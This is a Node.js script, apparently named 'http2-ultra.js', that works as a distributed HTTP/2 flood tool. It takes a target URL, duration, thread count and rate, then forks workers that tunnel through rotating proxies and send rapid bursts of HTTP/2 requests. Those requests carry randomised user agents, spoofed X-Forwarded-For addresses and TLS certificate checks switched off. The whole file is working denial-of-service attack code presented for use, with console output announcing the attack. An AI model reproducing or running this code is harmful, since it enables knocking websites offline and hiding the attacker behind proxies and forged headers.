process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const fs = require("fs");
const cluster = require("cluster");
const url = require("url");
const net = require("net");
const tls = require("tls");
const http2 = require("http2");

const args = process.argv;
if (args.length < 7) {
    console.log("Usage: node http2-ultra.js <url> <time> <threads> <rate> <proxy.txt>");
    process.exit(0);
}

const target = args[2];
const time = parseInt(args[3]);
const threads = parseInt(args[4]);
const rate = parseInt(args[5]);
const proxyFile = args[6];

const proxies = fs.readFileSync(proxyFile, "utf-8").toString().trim().split("\n");
const userAgents = fs.readFileSync("ua.txt", "utf-8").toString().trim().split("\n");

const parsed = url.parse(target);
const ciphers = [
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-CHACHA20-POLY1305",
    "AES128-SHA", "AES256-SHA", "DES-CBC3-SHA"
].join(":");

function spoofIP() {
    return `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`;
}

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function generateHeaders(path, host) {
    return {
        ":method": ["GET", "POST", "HEAD", "OPTIONS"][randInt(0, 4)],
        ":path": path,
        ":scheme": "https",
        ":authority": host,
        "user-agent": userAgents[randInt(0, userAgents.length)],
        "x-forwarded-for": spoofIP(),
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "referer": `https://${host}/`,
        "origin": `https://${host}`,
        "upgrade-insecure-requests": "1"
    };
}

if (cluster.isMaster) {
    console.log(`[ HTTP/2 ULTRA ATTACK STARTED ]`);
    console.log(`[Target]: ${target}`);
    console.log(`[Threads]: ${threads} | [Rate]: ${rate} | [Duration]: ${time}s`);
    for (let i = 0; i < threads; i++) cluster.fork();

    setTimeout(() => {
        console.log("[!] Attack Finished.");
        process.exit(1);
    }, time * 1000);
} else {
    function launch() {
        const proxy = proxies[randInt(0, proxies.length)];
        const [host, port] = proxy.split(":");

        const socket = net.connect(port, host);
        socket.setTimeout(10000);
        socket.setKeepAlive(true);

        socket.on("connect", () => {
            const connectReq = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n\r\n`;
            socket.write(connectReq);
        });

        socket.on("data", (data) => {
            if (!data.toString().includes("200")) return socket.destroy();

            const tlsConn = tls.connect({
                socket: socket,
                servername: parsed.host,
                rejectUnauthorized: false,
                ALPNProtocols: ["h2"],
                ciphers: ciphers,
                secureOptions: tls.constants.SSL_OP_NO_TICKET | tls.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION
            }, () => {
                const client = http2.connect(target, {
                    createConnection: () => tlsConn
                });

                client.on("connect", () => {
                    for (let i = 0; i < rate; i++) {
                        const headers = generateHeaders(parsed.path || "/", parsed.host);
                        const req = client.request(headers);
                        req.on("response", () => req.close());
                        req.end();
                    }

                    setTimeout(() => client.destroy(), 1000);
                });

                client.on("error", () => client.destroy());
            });
        });

        socket.on("error", () => socket.destroy());
        socket.on("timeout", () => socket.destroy());
    }

    setInterval(launch);
}
